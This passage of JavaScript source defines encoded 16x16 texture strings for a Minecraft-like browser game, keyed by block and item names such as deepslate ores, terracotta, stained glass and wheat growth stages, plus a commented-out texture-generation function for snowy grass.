    deepslateLapisOre: "0g0gdYH?W;W$HpZxYloZgZhqZ?ZHgZ1yyOhizyz>QOxy>zhA)>3N1p7g0i>y((1hhz0z*hyx1-y1Np00h0jy!OFlGkN(0ypp>giJw!Kh1w1ri(choO)w30hw2xg0ig2(hyh",
    deepslateIronOre: "0g0gaYH?W;W$HZH,HWaY1yyOhizyzQOOxzhQ>6O+2zxg1i>0O+hz0xIC1i03QNiOO01z>yzCwlNOy4>ig3)0y0hz00zB1iO1+0hD30z)M01gh0iAxhyh",
    deepslateGoldOre: "0g0g9YH?W;W$HJWZZYZH1yyNhizyzQzxy)>h12?Q>?NiA0>y*g30xx0x1i6OQNiO(K1zCzzii(1O21yQM>i0hz)V0hQ(3BkVKlg1*gz1O0m)(0yK0g2Awhy1",
    deepslateCoalOre: "0g0g9YH?W;W$H8wYEYsZPzZ1yyOhizyzQOQTyOzh1i>ONiDhi?MnV0hz0hyT0ARx1iQ>yNiOhCyzBig2NOT0yN)>ii0z)>?Kh)QhzQM1iihOm1z4O0g3M0xg0iiAwhyh",
    deepslateBricks: "0g0g7YZT4WAJHP)Z-H$Z4JPAjw000w1w08!8i5j)!FiA2>4JP20w10i1jw40iS#y8E#h10aI",
    deepslateTiles: "0g0g6$ZAJHT4W-HYP)Z090J1P$JVpPAKpA0qJA1wgPJ%Uc0od1wg0w2Pd^$3PAw2J|A109AP+2",
    deepslateTop: "0g0g5HYPBWH;W5yS1giAdQi^6hxw0Eg0P]3R!QdIJ0,1xaA78dQ1>Igr@S32IA]JsxhQ0A,0AyBi",
    polishedDeepslate: "0g0g7ZY$ZP)ZT4W-HAJH00S42a4#A4jJhAUcAlFzCBmNBPCie@&Jl#AmhJPJii_Ja]JAJJcJJ}F",
    chiseledDeepslate: "0g0g6AJH-HT4WP)Z$ZY000000FB+JIJ]]A0]419C04S0X02i{5+S2+IAUhg14BCFoipx(K000000",
    cobbledDeepslate: "0g0g6PAZ)YY;HYY0qcTA^c#?5JbwV09#U+^3cq1M?cm%JSmoe5J_0S+U>Si]knS]y",
    deepslate: "0g0g5YH?W;W$H5AA}@?CAiJ,rQ2^CA1kBk4rPqFB-|+EQPzE)BN0|+F9F}.r0K]0S",
    tuff: "0g0g5WZ|QH7YH4Jjw2rFib%J]00QS%0%aBbXxmC+03wy]b16S(S$mgrFwbAcX822SSmPg",
    
    amethystCluster: "0g0g8000WZ&HWWZZHHpZ00000000100000aK0000^X0002^00200c000dp0]FhNjN%>x6t8000|O00W0",
    largeAmethystBud: "0g0g8000Z&HWZHWWZHpZ000000000000000000000000000000000000000w00001E000090000l01%X1)*12LS0000",
    mediumAmethystBud: "0g0g6000WZ&HpZHZ000000000000000000000000000000000000000000000000000000000w00001Q000y1Qk00k(00p00J/00@0",
    smallAmethystBud: "0g0g5000ZWWHpZ000000000000000000000000000000000000000000000000000000000000000000000w00001{0004%w00k00>zNo0",
    buddingAmethyst: "0g0g9pZHZ~WZ&HWYHQZ1igjQ1CiB1xBi2735g1w(1BhiM0NBR7[>0)?(2i5-w>gw1h8M2hj7INh)X**wizi2g5MM5)71iO0jNgigjlglK1xh)x+",
    amethystShard: "0g0g8000/YZ&HUYWWZHWZ0000000000000004JS000FA00100aJ0003N00p*;00Z<01;$001K0010000,00002S000000000",
    amethystBlock: "0g0g7pZHZ~WZ&HWY5ibJ!8na]5dI4F0EkMy9j]Eg2!Qg6wgAB5U!!Il0F5Dw8$kPs",
    
    snow: "0g0g3ZZZZZZZlTlSVhV!VlVah]kBh?UF^iqS?kVa0VUE4ml10V",
    powderSnow: "0g0g3ZZZZZYlTlSVVhVCVlV6h]kBh?UpPiq@S?kVagVUo4ml14V",
    snowGrass: "0g0ghZZZZZZZZHUZCYYZnWZYlZYoHZH0004Rgh8S0XgXy8Xg0S02h4x8R000o14x8Rhw(c20MFcMooPJ}M%:o%m",
    /*n => {
			const pix = getPixels("0g0g7lZYYYoHZH49Pg?S9(J9C)yBkaE%U{)9E84]2$FkQ?Pwh?0KNFih{RPA?${)9FX1kEiBy");

			for (let i = 0; i < pix.length; i += 4) {
				setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}

			const { random } = Math;

			for (let x = 0; x < 16; ++x) {
				const m = random() * 4 + 1;
				for (let y = 0; y < m; ++y) {
					const d = random() * 0.1 + 0.9;
					const r = 0xff * d;
					const g = 0xff * d;
					const b = 0xff * d;
					setPixel(n, x, y, r, g, b);
				}
			}
		},*/
    snowball: "0g0g7000$YWYHZZZY000000000000009A000200ko00n00O000000z00l00>o009aS000A00000000000000",
    powderSnowBucket: "0g0gb000dWZZZHYW)HZZYYWH000hh000001y)g0005iC>T00@)NM?00Ui)kl00VO>?V00VU00GX0000X00005G00500000005VV0000000000",
    
    bread: "0g0g8000xHZHyH;Z{WV1H0000000004J0001FS00aJ@00^]03A@0pA0JB0qzS5Pzq05A]05y@0t+J)00s003i0000000",

    dirtPathSide: "0g0gc000)Y4WWYYZYYlZoHH00000000iiNOxN)NkilzxyOiCAlBAzn-G?+IVGGGIGIGIGGGIIGGGGIIGIIGI",
    dirtPathTop: "0g0g44WWY)Y55l9l?bB>9V?koQ|_5V3lUQT?U?PQUVl",
    farmlandMoist: "0g0g6UZ;Y)KHHVVHZ0S0rKw>0k3cy0ko>KiK]k>1kScX8>Kk34ypy0rcy>KrKK32gk>KrKl0y3cySckoyocSK",
    farmland: "0g0g6YYYlZVVHZ0S0rKw>0k3cy0ko>KiK]k>1kScKk8>Kk34ypy0rcy>KrKK32gk>KrKl0y3cySckoyocSK",
    boneBlockSide: "0g0g4HWHY66++***++***66",
    boneBlockTop: "0g0g6qH!ZWYWW5,AJ+FF+|Sh2Ja0UI1UXb?cX1c{I%U0j?||29F+,AJ+I",
    
    glowBerries: "0g0gg000RZW{HFZ%JYiZ1WTZHUH5ZYYhY.W000000000000iw000001)000003RK0000QK0007Qm009400850950900909000000e0000000000000000",
    
    hayBlockSide: "0g0g9WW1ZWRHyZRY2WXZ1x3xxTx>xxzxAxT42T1A244QGAA4AAA42xTx34AA4T>xzT>AxT>>x>T>>>>>>>>>>>z>>T>>x3xAARx1TG2w022A2240A44y24A4x1xA434x3x3>zz",
    hayBlockTop: "0g0g5WW(YWY5yBA^2JRPQiw8F${h9qP8T@4SM11?o2?iyiF(a5a){EX9BkRRA8",
    wheatIcon: "0g0g7000ZV>YWVWYH00000000}2000g100j)800poS00x^00B00q01&0600)m09JSAe0006+0005C000840000",
    
    diamondShovel: "0g0ga000cH8JWOYCY#qZ]HJHEYMZ0000000000000000000001i000000j)w00001*>w0000jUw00006?N00000w000062000000000060000000000000000000000080000000000000",
    goldenShovel: "0g0ga000H;ZZHHH]HJHEYMZ0000000000000000000001i000000j)w00001*>w0000jUw00006?N00000w000062000000000060000000000000000000000080000000000000",
    woodenShovel: "0g0ga000)WwKYJHTZW]HJHEYMZ0000000000000000000001i000000j)w00001*>w0000jUw00006?N00000w000062000000000060000000000000000000000080000000000000",
    ironShovel: "0g0ga000?kHoYZZZcWY]HJHEYMZ0000000000000000000001i000000j)w00001*>w0000jUw00006?N00000w000062000000000060000000000000000000000080000000000000",
    stoneShovel: "0g0ga000PAYoYYZEY]HJHEYMZ0000000000000000000001i000000j)w00001*>w0000jUw00006?N00000w000062000000000060000000000000000000000080000000000000",
    
    diamondAxe: "0g0gb000cHOYCY#qZ]HMZ8JWuDHEYJH0000000000001g000000ix000001zT00000iO*K0000>00007-,00000,000057000000000500000000000500000000000000000000000000",
    goldenAxe: "0g0gb000HZHHH]HMZ;ZWEYJH0000000000001g000000ix000001zT00000iO*K0000>00007-,00000,000057000000000500000000000500000000000000000000000000",
    ironAxe: "0g0gb000?kHZZZcWY]HMZoYHEYJH0000000000001g000000ix000001zT00000iO*K0000>00007-,00000,000057000000000500000000000500000000000000000000000000",
    stoneAxe: "0g0gb000PAYYZEY]HMZoYZEYJH0000000000001g000000ix000001zT00000iO*K0000>00007-,00000,000057000000000500000000000500000000000000000000000000",
    woodenAxe: "0g0gb000)WJHTZW]HMZwKY1YEYJH0000000000001g000000ix000001zT00000iO*K0000>00007-,00000,000057000000000500000000000500000000000000000000000000",
    
    strippedDarkOakLogTop: "0g0g9)Z(Y{Y]HY(Z-W;W-Z0g0hg1002yzz>NyxiVGGS2URyzyCx3OOOOD(i+C(3*OO+x3+,D-3+,C-3+OO+(3+D(OOOOC(zyyACMixiyOz)Oywg0g00hg",
    strippedSpruceLogTop: "0g0g9QWSZQZYHYiHyZRZ0g0hg10yzO))U>O(jGIIG3O)O,M4QQQQ-Sj[,Sk@QQ[Mk[[X-S4[[,S4[QQX[S4[X-SkQQQQ,Sj)OO*,TjGGGGM3OQ)?QO(0g0g00hi",
    strippedJungleLogTop: "0g0g9H4ZlWkZmHH+YHY0iN0002x4Q??UQTkGGIIGK4Q?Q[RlVVVV]kX[BVVRlX]5X[lXVVlG]5XVVVV[AX?QQ@[kGGGGTkQV?VQRhx0ihhg0",
    strippedAcaciaLogTop: "0g0g8YHHWZNYRYW09wg09A!ZaJ|BfC#*L,,Lf*ffDL#P?#9C0802]",
    strippedBirchLogTop: "0g0g8*HW8HYEZHGHH4J84J]FAaZ!J|BLC#*f,,ff*LfDLbP?b9CAPAP",
    strippedOakLogTop: "0g0g9YWWVZ*HWHWkZ1gw0yxh23O))U>O(3GIIG3O)O,(4QQQQ-Sz[,T4@QQ[M4[]XX-T4[],S4[QQX[Rk[X-R4QQQQ,R3)OO*,S3GGGG(3OQ)?QOM0g000000",
    strippedDarkOakLog: "0g0g5-W]HQWH{H5+&m]1C$]8$]5XI4AI9B-9rMoaAMpaalpMja9[pBJ85-5)I5)%+I9>r|C8xQ",
    strippedSpruceLog: "0g0g9RZWHHYHYYW1z?)yVh5A*Bjg4)xjUgkVR+kgljC)lhmUUh1MkTUx2UNl*x2ARB*2BRU5M2xVU10iUU1xixkUV*wilk?T)w1zT@wilh",
    strippedJungleLog: "0g0g7HlY5HkZ+W4Y@H0J6]Pp00J1ym^JqAE_P|feS1x>RPCB)iNkzs&PcJiJX809y]7Qg1i",
    strippedAcaciaLog: "0g0gqHYZYYZZYZHYZZYYXWYZHZZXWHYHZ0QMx^CgFI_gF-8_QFaSJ?4o-RKwzp*(Mh3(M9Xohb0io)93Io)y38sUMyI)xg9|,OhFmMXVMzw0",
    strippedBirchLog: "0g0gnWWYWYZHYH8HHoHWHWWHZZYY8WZ0QM4>oXx440]M4oQM4C-]Q4PMoCMIKFMpX.Kxcjc#9^ynEiNInTE-INn>FR)(n>FQ;k2Q?1829^P01c8^j4lg^MoRox51*pQw",
    strippedOakLog: "0g0gmH4YVYW*W*HZHH?Y*HHWZWAZWBW?H?Y4H?H0QxoMk?0]xhkS]jkg5TRilg5?aidyM}0Q>tyM}2T%pAT2CoQSpDhQ1i9Di@(8>wI(Q8>xoTFUT28h!?5R8hwM8>gw_0@M8gxd_",
    
    mushroomStem: "0g0g4;HbHrZZ0K000B08EFHZHHF000E2ZZVVS92",
    mushroomBlockInside: "0g0g5HZY@HW0F0g1C480I0J9y4T42Sk8h9)AT)i0wiTw0I80Byd4]Cw900A^]J]h0h9yT0kw2CcA04iJAU",
    brownMushroomBlock: "0g0g4WWWYohlwTlR?5?VlUmxVk5Vl?P?hV@?lAQjS8?5qX5RlTV",
    redMushroomBlock: "0g0g6HWYYZY44XA2iSkw+JPA11PA1Bwi]+18iR]JS5AJ4.9Aw:oF0JP6]iPAi1A3K4JP0siiSitA90>AA0900",
    brownMushroom: "0g0g8000YHUWOYUY{WZ000000000000000000000000000000000000000000000000009E0000PF004^P(008000500007000010000100",
    redMushroom: "0g0gb000<WYTWZHTYnZHY^Z000000000000000000000000000000000000000000000000000000000000000000000000000iy000003yz(0000OyO>0000?OV00000700000090000009000",
    
    myceliumSide: "0g0ggWWWYWYEWW-Z2Z]WYYYlZH0iO?xB>Tj0Qk)QzgM?-?NxMh^TQ3+Mq!BmIjSp.a/{tr$s",
    myceliumTop: "0g0g7WWWYWYW0?XAM%{mP-ch6U(d$AI#E6NcCmz0.x%E",
    
    //the wheat texture is up there
    wheatSeeds: "0g0g70003WY%0Z?HYH00000000000000000000000000S0g0000200004020602E000Eo0000+0w0002+0003K00000000000000000000",
    wheatStage6: "0g0g7000HKYYWZZ00000000a00010j00090B00902S02A3(0220m1a0)gkM!d2hTg9>i9Tgw(z{!+yE&a%kE",
    wheatStage5: "0g0ga000PWawH2YZnNZKY5HZhZ0000000000010000000h0000000h00000g01y0001(04g0000w600000N0403000(605O0Ow83w0Jg@3N1gSI68y1nIKI487wK1[4S74G",
    wheatStage4: "0g0ga000PW2YnNZawH5HhZZKYZ0000000000000000000000000000000000010000000i00000003A0000w02S0000Nw200000A2A00S0yST03w04Sn4AwK85A5gV85@58p96",
    wheatStage3: "0g0g80002YnNZawH5HhZPWZ000000000000000000000000000000000000000000001000002A000(1K001g_000r0(05I%0mweI6hw7hwJDgPw",
    wheatStage2: "0g0g6000awHnNZ2YhZ5H000000000000000000000000000000000000000000000000000000000w00002K000K001p0004c00640NEQk",
    wheatStage1: "0g0g4000awH2Y5H00000000000000000000000000000000000000000000010002S0g5009730c3c",
    wheatStage0: "0g0g5000awH2Y5HhZ000000000000000000000000000000000000000000000000000000000000000000000000000000008000002w(02030S0",
    
    lightGrayGlazedTerracotta: "0g0gjY|WVZHmZmWVYsYmY?*WoHY|VHJPWWWHmPWmY0Qh4x@30A8@hxS4xoE7S6008X16pFo#-2g008R1@g38Rl48RX4xoR54aR:RgsEp]Rgjzg8J>98R8Q0a00gSX5x8S0Xo0R0Io(x020IoRwIw",
    lightBlueGlazedTerracotta: "0g0geyrZ)Y/Y}ZZ$ZZZy$HxHEHYNYYZY1iO>lR,hzNzzG5kNOGGN7G2wGDGN7GNG)EtGRDiN7ONVyGzOOi7)OyGANOyrNyV$RyiNy$",
    magentaGlazedTerracotta: "0g0ga:ZYW{WYZYZHZ1xM?Uy1111AR111xU?111BDR12?G22?9BK3O6V0zO0?I+GXVQV6UQQ1xBDR11114,P111148Px11146R1x114G1x115QQ1111MMM.11",
    yellowGlazedTerracotta: "0g0geZZHZZZHZWZHHZZHZZZY5H1yOxw2?ix[yiyQyiyixh1Dy2x!OgMwbiMxyhyryiixGiD>hxzyxy^2inzli2jiMyiDkzIP1y>hgi$?h1nXT1t",
    purpleGlazedTerracotta: "0g0gaIYZW$WZY(YKYZW1zOy(4O(0iN2(S>0x0wzSO04Nxz6+5[Oy2)6KGNgwCSVGxyN2.gyO>xy,TTOS4N2,06KNy-S4OKO(SS+0U4S)09[ISQ4O5[h4(U8Q[hU5P0lh[",
    orangeGlazedTerracotta: "0g0gg1ZmZHHZZvsHqYmWZmYWWWZZlYmZ0gzyk?VK08nzD0xn0bwxb1cVy,c0cD0{0hIc5hhSy6_0Q{0cwgcw5u01lmhVyVix5uVh",
    whiteGlazedTerracotta: "0g0gdZZZZy$H/YWZHZZ?WH^ZZHH01g01zAg5hhhT6hKUhEmhhmVoA1hhh[1hoyT1k1KhyJhR1?o!,hoz1hRODhy.hoDDiDyyhhDTNhhihm0yTkhhoDhR/g0R,1hkz.F",
    greenGlazedTerracotta: "0g0ghWHPHYHH<W|HVY?WHHxH1H|WWPW02h8xgRz0xiU?8{OCV9-AU>g4I@>^6/9E8Rh^Pkz8{>R_QkXiURiJ<2ogXRwq%[]R>xm]xas?x8>Oky51888XTso{MIXgMz",
    brownGlazedTerracotta: "0g0gfW[ZZWlYlZHW5HmpHH?*WKZ2WH100zg?lQg6ziQhU00Gwx4l60wwbPh7yc1%V72gQyGDaqc3(DKich!06Kx2hi0$Q0xh!rU_hyVhup_?hQ0??QTUcQ",
    blackGlazedTerracotta: "0g0gj$W$HWWEW00WAJYAJZIZQTW4gHgTWoYsWU(Z(Y-W<4H)Z0Q(gEc0A4Eax!gXgaClbooP)(Sq^$18ggo%oICt#m|SM$oX.F3Xx0Niqh@A_F*E>CEE}K@,$KRM^d%^i",
    pinkGlazedTerracotta: "0g0g7ZYY!YYZW4A!xFPAF_i^|J~AAP_,CPA+JP;JPB#BFP_iPJ}+^+S",
    limeGlazedTerracotta: "0g0gchZZZHYHHZHZNWWHMYH1zOOO)?KlSyyyy[hA>8IEwD(O-IwDN3OI0?nN8O[4UN8XnQNlSNwqhU2N0IVS2NyI?lQ02RX?lQ0Qy?U0y4Sy_mlU0I410yw?K",
    grayGlazedTerracotta: "0g0gd?*W)ZYZW(YZYHHP?H<4HTAZ1iMQ[0hhP?0hjC1hg0yK1040xc5QPh6lVkP(lcQ>ymhTg[xwqhh4EzVgTk[yrM4l4KQQ5P6(S4QVRzMc7Syh0Q1j#s1g",
    cyanGlazedTerracotta: "0g0gjlYmZ?*WH|WqYhYmYmZ-W)ZqY<WlWmWlZlW(Y<4H02xcEXt6^(g6lh6xgR(u0;g8UX@^J0068UXxUU7.JoRKb38?q^R8K?^{hlglF^lhCPg(0p000K4x0038{n!%09XgS",
    blueGlazedTerracotta: "0g0g6$Z?WwWwYy$H<qY5wP(xwP(Cri/0pS2ib2|+K))F+]S|Pdqi!?w0*K46]6+r96>T16]",
    redGlazedTerracotta: "0g0gaWIZWHAHHVWH3Y[Z10g0z)?O0ggg0+[(5O*wC(3(6Q(6QQk@0CQQS0iQ2XO,R1g4->VO2)>)*wQ)?)>OOX@?)[OQ*-Q*>,@O>O->@PQQ])P)Q)O",
    lightGrayTerracotta: "0g0gdWHWZHWWWZHHWZ000i2wO(0hk05i006000w2y03700001iEO0h00gw0002w1y0907ywg0y2w00yi005yxgw00000Vh0012h000000xyyw0000r0005000x5c(00y0205l50O0",
    lightBlueTerracotta: "0g0gaYYYZYYZHHY1hw(?0hg0O+00(g140hg000002hl00003(1ixO00(0w000030013x052K10g000K1100V(01h1000O01j,0O01g0g0050w02g*1w000612w07gx004w000(02x0",
    magentaTerracotta: "0g0giZYZGWZZYWWYZZ@YGWZGWY@Y0Rg89^KXC06O@]w1iXKXCwXx$PhQKXAg0x8h]T(C0@M0@EXz8RgXx85wXz44(Sy@gcigAwx8Rh4g400IcggX1iS18(XggM81840ISxQxk004wrj8RgX;Mj8gg0Xw4gXx8gX42",
    yellowTerracotta: "0g0gfiW2WiHyH2WiHiYyHyH2HyY1ZyYiH1Z1hiO3MQT0O10OS1A1khyD0zxQlw0y1z*AThI0xNg2yyy3yhh2OhVjN2yVhh2OOhhhwhy0xoyO01g1gyOzNh01hkgyyzz1hgOy#Sh2B1lyyBNyxk2",
    purpleTerracotta: "0g0gmlHlHlYBY5WlZBHlHlWBHlWlH5WBYBYlYBZ5HBZBHlW*Y0Rg882g06M01(114h0]c0oa(2g#0000a0g000o60000003]04f0S1wo0kFo000oSw03M0o0X41003p00I1(01I000ocK0000wg001Oc80Eg21010cw900c36g0",
    orangeTerracotta: "0g0gjRHRHHYYRWYRHHHRHRYYZHYRWHNW0Rg88208Now0w110XwSXwARh40!00w00h8k8@(0SwX0004x84SX04b0SywT(0kwEw008RM4Xx0IgKg2gXx02h800ggS8180gSwxw8S00xgI2gXT;10wg2A0y104w480Xx8gX22",
    whiteTerracotta: "0g0gfWWWHWWWZHZWZHWZ1hw)SG0O-04g150GSS49Q2Gq00096[xO00KSw004S6QS1ax0@RS1QkK00QQ[704(S7100QO07j:401g0g0Q@Sw02g+1w04Q{72w4bx0QeA04Q420",
    greenTerracotta: "0g0g9PRY|Z|RY|YPY|RZPRHY|RH001h1g002hh03h2w0000OO3OMN02w4ywMj(00hw(jg2yyOO1Mg0Bw3h(i0O3i2zhhg001hhii000w0Ohy01mOhzw2w2(hjMi0220n03zOMTw2KyhA80w0Owz3)ThTN0z",
    brownTerracotta: "0g0g7{H{W{H]WH{WH4JFm5]FCPcJPwPm0w9ACSh201AXP2@AAQS0JPNP9ASJP4wjx^xPAigAAiPRPABJk8m91y^9APi",
    blackTerracotta: "0g0g6AWAWAZwWwZEW0094X0000c4wR4A00i4i00wX0001A00S2Rw2Tw09A0J]wA002PSw^00000A]00)A04a490Ag0000]0A",
    pinkTerracotta: "0g0gh)Z)Z*W?WAYQZAZ)Z?W)ZAYAZ?W*WQZ?H)Y0Rg882g06MI01@O0113ooww0S3gF000000)g00o600000X03o04d0S1o0hzo000oSo026MKo041004x00Mi6(01(00SoXcK000w0K00h^N60wg01S010g430X205g2",
    limeTerracotta: "0g0ghHWHYHHWWYYHWHHYWW0Rg89ajo06)A1812jg00k_hQjo$0000xhaxo@M0TwX0IS04x84hQ0Xc8SyITg2h8Bw008RgXKs00IcKg0X10S0080IM01-40I0x4xkS00Xwr220X-D8gI0130x04w4y00080Xj0",
    grayTerracotta: "0g0g6-H-W-H;H;H)W4iFiP5-9xyPkJP008i]009d1PB1K2000382QA44aS009iP1A0JP4qwi1PAi0{0AiPJS0wCJj0i902]00o0i]",
    cyanTerracotta: "0g0gjVYVZZVHVWVYVZYYVYYZWZZVHWHVVH0004R0X1004xg01Qw00M0s0gRj95g3a00008Xxc004w0wgQK0002x42gK0b008Sg0182g004Rg000Qx9g00000000c098Xwk00000CgXx8S000000k18Rw00y010|x01Xw02(RgIT8R001",
    blueTerracotta: "0g0g9]Y]Z{Z]Y]Z{Y{ZQY|5Z001y2w000yx03x00S000xhTOig050300iyg00y0gxk000hh2xk0603ygg0y2w01hig001yywg00000hy0S2why30000kyhiw0000y031hih0001S004h02Thhxhg01",
    redTerracotta: "0g0geZZW3WIY3WWHZIZW3HYY1hiO3MQh0*18Og191ph!3Izo0001NAhhVwo0E5zwhmh8Owhyj(08yz.hh2OOwhhh0h81l1go*yz(h01hhg831hTo*0dSh0E1ia22ha",
    terracotta: "0g0g5HWWWXH4J0{i]ePpNQ18P47o0+XJ]JiPBzA0P82P0]QJ@aAiPPi0ETA42]wiK2Px@]0|y40J_i]Bg1JPe@]Az0iS",
    
    ancientDebrisTop: "0g0g7SHYnZkW]W(WZ0bAE2i&.2S5n(q6g|aXVsCKx2%0U]V40?<E]odkT",
    ancientDebrisSide: "0g0g7ZkW]WSH(WYnZ4QArSI0|w0S0ctS40#0g}|w}iPCAJ|Tz9kJP0SJ]r]PdiS0I2&,U209AXX",
    
    yellowStainedGlassPaneSide: "0g0g5000...001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    yellowStainedGlass: "0g0g3EpC0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    whiteStainedGlassPaneSide: "0g0g5000ZZ001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    whiteStainedGlass: "0g0g3ZZZZZZ0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    redStainedGlassPaneSide: "0g0g5000...001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    redStainedGlass: "0g0g3pC0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    purpleStainedGlassPaneSide: "0g0g5000.001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    purpleStainedGlass: "0g0g3EpC0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    pinkStainedGlassPaneSide: "0g0g5000.001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    pinkStainedGlass: "0g0g30000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    orangeStainedGlassPaneSide: "0g0g5000...001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    orangeStainedGlass: "0g0g3EpC0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    magentaStainedGlassPaneSide: "0g0g5000<$s%.001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    magentaStainedGlass: "0g0g3<<<0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    limeStainedGlassPaneSide: "0g0g5000Hx1Hh001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    limeStainedGlass: "0g0g3HMHMHM0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    lightGrayStainedGlassPaneSide: "0g0g5000JP.-001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    lightGrayStainedGlass: "0g0g30000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    lightBlueStainedGlassPaneSide: "0g0g5000{;.001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    lightBlueStainedGlass: "0g0g30000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    greenStainedGlassPaneSide: "0g0g5000...001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    greenStainedGlass: "0g0g3EpC0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    grayStainedGlassPaneSide: "0g0g4000|)PA?k01001001002002S0010020020010020010010010010010010",
    grayStainedGlass: "0g0g3|)|)|)0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    cyanStainedGlassPaneSide: "0g0g5000|P.?P001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    cyanStainedGlass: "0g0g3|||0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    brownStainedGlassPaneSide: "0g0g4000O.z.i01001001002002S0010020020010020010010010010010010",
    brownStainedGlass: "0g0g3OEOpOC0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    blueStainedGlassPaneSide: "0g0g5000M:.M!%qM!001S00001K00001S00002S00002w00001K00002K00002K00001K00002K00001S00001K00001S00001S00001K0000100",
    blueStainedGlass: "0g0g3*:EM#pM:C0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    blackStainedGlassPaneSide: "0g0g3000ok01S001001S001S001S001001001001001001S001001S001S001001S0",
    blackStainedGlass: "0g0g3ooo0000lVVUlVUmVVUpVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVUlVVlVVlVVU0000",
    
    lightGrayStainedGlassPaneTop: "0g0g5000JP.-000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    lightBlueStainedGlassPaneTop: "0g0g5000{.;000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    magentaStainedGlassPaneTop: "0g0g5000<$%.s000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    yellowStainedGlassPaneTop: "0g0g5000...000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    purpleStainedGlassPaneTop: "0g0g5000.000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    orangeStainedGlassPaneTop: "0g0g5000...000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    whiteStainedGlassPaneTop: "0g0g5000ZZ000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    greenStainedGlassPaneTop: "0g0g5000...000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    brownStainedGlassPaneTop: "0g0g4000O.z.i0000000000000000000000000000V0000000000000000000000000000",
    blackStainedGlassPaneTop: "0g0g3000ok0000000000000000000000000000VVVV0000000000000000000000000000",
    pinkStainedGlassPaneTop: "0g0g5000.000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    limeStainedGlassPaneTop: "0g0g5000Hx1Hh000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    grayStainedGlassPaneTop: "0g0g4000|)PA?k0000000000000000000000000000V0000000000000000000000000000",
    cyanStainedGlassPaneTop: "0g0g5000|P.P?000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    blueStainedGlassPaneTop: "0g0g5000M:.M!M!%q000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    redStainedGlassPaneTop: "0g0g5000...000000000000000000000000000000000000000000AJ]PEJk000000000000000000000000000000000000000000",
    
    cobweb: "0g0g4<W000ZZZYlVUlUGr=?-}?^UllVU",
    
    strippedWarpedStem: "0g0g7/H+Z@ZN-Z=H&nYNEH44TwKX9S8T8?J]Aol0Qkl20lP(Xh(ck41wog2w*wR(Ec,r4hlR9pwi90",
    strippedWarpedStemTop: "0g0g9N-Z/H+Z/-Z/8W+WtVW%WFH1gw0yxh23O))U>O(3GIIG3O)O,(4QQQQ-Sz[,T4@QQ[M4[]XX-T4[],S4[QQX[Rk[X-R4QQQQ,R3)OO*,S3GGGG(3OQ)?QOM0g000000",
    strippedCrimsonStem: "0g0g7IYYWWmYYW44TwKX9S8T8?J]Aol0Qkl20lP(Xh(ck41wog2w*wR(Ec,r4hlR9pwi90",
    strippedCrimsonStemTop: "0g0g8WIYWXYH]HWY4X0PiRds+eZej.AJ[~[jPPjj[jO.jAJ[frfds@00000",
    
